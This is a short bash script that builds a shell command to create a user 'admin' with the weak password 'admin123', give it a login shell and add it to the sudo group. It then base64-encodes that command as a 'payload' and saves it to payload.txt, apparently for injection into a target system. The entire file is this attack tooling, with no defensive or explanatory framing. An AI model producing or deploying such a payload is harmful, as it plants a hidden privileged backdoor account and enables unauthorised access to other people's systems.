#!/bin/bash

USERNAME="admin"
PASSWORD="admin123"

NEWUSER="useradd $USERNAME && echo -e \"$PASSWORD\\n$PASSWORD\" | passwd $USERNAME && usermod -s /bin/bash $USERNAME && usermod -aG sudo $USERNAME"
ENCODED_PAYLOAD=$(echo -n "$NEWUSER" | base64 | tr -d '\n')

echo "$ENCODED_PAYLOAD" > payload.txt
echo "Payload has been encoded to base64, saved payload.txt"
